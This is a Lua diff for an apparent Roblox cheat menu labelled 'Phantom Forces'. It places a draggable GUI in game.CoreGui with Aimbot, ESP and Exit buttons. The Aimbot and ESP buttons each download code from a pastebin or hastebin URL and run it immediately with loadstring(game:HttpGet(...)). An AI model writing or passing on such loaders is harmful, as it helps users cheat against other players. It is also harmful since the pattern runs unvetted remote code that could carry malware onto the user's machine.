@@ -1,0 +1,81 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local aimbot = Instance.new("TextButton")
+local esp = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+local exit = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.517581761, 0, 0.516700387, 0)
+Frame.Size = UDim2.new(0, 183, 0, 167)
+Frame.Active = true
+Frame.Draggable = true
+
+aimbot.Name = "aimbot"
+aimbot.Parent = Frame
+aimbot.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+aimbot.BorderSizePixel = 0
+aimbot.Position = UDim2.new(0.0396174863, 0, 0.211146683, 0)
+aimbot.Size = UDim2.new(0, 168, 0, 35)
+aimbot.Font = Enum.Font.SourceSans
+aimbot.Text = "Aimbot"
+aimbot.TextColor3 = Color3.fromRGB(255, 255, 255)
+aimbot.TextSize = 14.000
+
+esp.Name = "esp"
+esp.Parent = Frame
+esp.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+esp.BorderSizePixel = 0
+esp.Position = UDim2.new(0.0396174863, 0, 0.465568185, 0)
+esp.Size = UDim2.new(0, 168, 0, 37)
+esp.Font = Enum.Font.SourceSans
+esp.Text = "ESP"
+esp.TextColor3 = Color3.fromRGB(255, 255, 255)
+esp.TextSize = 14.000
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.191256836, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 110, 0, 35)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Phantom Forces"
+TextLabel.TextColor3 = Color3.fromRGB(255, 170, 0)
+TextLabel.TextSize = 15.000
+TextLabel.TextWrapped = true
+
+exit.Name = "exit"
+exit.Parent = Frame
+exit.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+exit.BorderSizePixel = 0
+exit.Position = UDim2.new(0.0396174826, 0, 0.737849772, 0)
+exit.Size = UDim2.new(0, 168, 0, 35)
+exit.Font = Enum.Font.SourceSans
+exit.Text = "Exit"
+exit.TextColor3 = Color3.fromRGB(255, 255, 255)
+exit.TextSize = 14.000
+
+aimbot.MouseButton1Click:connect(function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/sUdKCcd1'),true))()
+end)
+
+exit.MouseButton1Click:connect(function()
+	Frame.Visible = false
+end)
+
+esp.MouseButton1Click:connect(function()
+	loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/ujigupumog"))()
+end)
+
